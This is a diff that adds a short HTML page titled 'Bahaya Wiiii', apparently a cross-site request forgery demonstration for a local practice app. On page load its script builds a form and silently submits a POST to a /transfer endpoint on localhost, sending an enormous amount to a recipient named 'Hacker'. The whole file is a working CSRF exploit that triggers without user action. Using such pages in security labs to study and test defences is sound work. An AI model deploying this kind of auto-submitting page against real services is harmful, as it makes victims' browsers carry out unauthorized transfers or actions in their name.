@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>Bahaya Wiiii</title>
+    </head>
+    <body>
+        <script>
+            // Create the form element
+            const form = document.createElement("form");
+            form.method = "POST";
+            form.action = "http://localhost:3000/transfer";
+            
+            // Create the 'to' input field
+            const to = document.createElement("input");
+            to.type = "text";
+            to.name = "to";
+            to.value = "Hacker";
+
+            // Create the 'amount' input field
+            const amount = document.createElement("input");
+            amount.type = "text";
+            amount.name = "amount";
+            amount.value = "1000000000000000000000000";
+
+            // Append the inputs to the form
+            form.appendChild(to);
+            form.appendChild(amount);
+
+            // Append the form to the body of the document
+            document.body.appendChild(form);
+
+            // Submit the form
+            form.submit();
+        </script>
+    </body>
+</html>
